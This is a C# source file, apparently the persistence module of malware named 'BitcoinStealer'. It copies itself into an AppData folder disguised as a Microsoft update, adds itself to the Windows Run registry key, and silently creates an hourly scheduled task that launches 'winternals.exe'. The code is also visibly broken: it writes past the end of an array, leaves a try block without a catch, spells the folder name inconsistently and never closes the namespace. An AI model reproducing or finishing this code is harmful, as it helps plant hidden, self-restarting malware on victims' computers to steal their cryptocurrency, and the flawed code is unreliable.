using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace BitcoinStealer
{
    class persist
    {
        public static string[] FilePath = new string[2];

        public void InstallImplant()
        {
            string selfPath = Process.GetCurrentProcess().MainModule.FileName;
            Process pProcess;

            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\MicrosofUpdate");
            
            try
            {
                FilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + Config.FileName[0];
                FilePath[1] = Environment.GetEnvironmentVariable("APPDATA") + @"\" + Config.FileName[1];
                FilePath[2] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\MicrosoftUpdate" + Config.FileName[2];
            }
        }
        
        public static void cmd(string command)
        {
            var process = new Process();
            process.StartInfo = new ProcessStartInfo("cmd", "/C " + command);
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public void PersistImplant()
        {
            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            rk.SetValue(Path.GetFileName(currfile), currfile);
            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = "%APPDATA%" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
            System.IO.File.Copy(src, dest);
            try
            {
                cmd("schtasks.exe /create /tn hspintsdk /tr %APPDATA/MicrosoftUpdate/winternals.exe /SC hourly /mo 1");
            }
            catch (Exception)
            {
                //exception ignored
            }

                
        }
    }
